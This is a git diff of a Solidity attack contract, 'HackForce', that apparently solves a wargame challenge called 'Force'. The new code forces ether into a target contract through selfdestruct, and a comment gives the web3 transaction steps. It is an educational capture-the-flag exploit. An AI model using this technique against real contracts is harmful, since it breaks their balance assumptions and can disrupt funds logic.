@@ -4,18 +4,17 @@ pragma solidity ^0.8.0; // Latest solidity version
 import '../contracts/Force.sol';
 
 contract HackForce {
-    address payable private owner = payable(0xF7c76375227291b07Ed724f3C312B9029e8bA4fA);
-    mapping(address => uint256) allocations;
+    receive() external payable {}
 
-    constructor() public payable {
-        allocations[owner] = msg.value;
-    }
-
-    receive() external payable {
-        allocations[owner] = msg.value;
-    }
-
-    function close() public {
-        selfdestruct(owner);
+    function selfDestruct(address payable instanceAddress) public {
+        selfdestruct(instanceAddress);
     }
 }
+
+/* 
+    The first thing you need to do is to send ether to the address of this contract HackForce
+    -await web3.eth.sendTransaction({from: player, to: "0x5Ad56425af0082536CF64394F6DAbF0F318Cae68", value:1000})
+
+    Once you have ether on it, you need to call the selfdestruct function
+    This way the smart contract called Force can't reject the ether send it
+*/
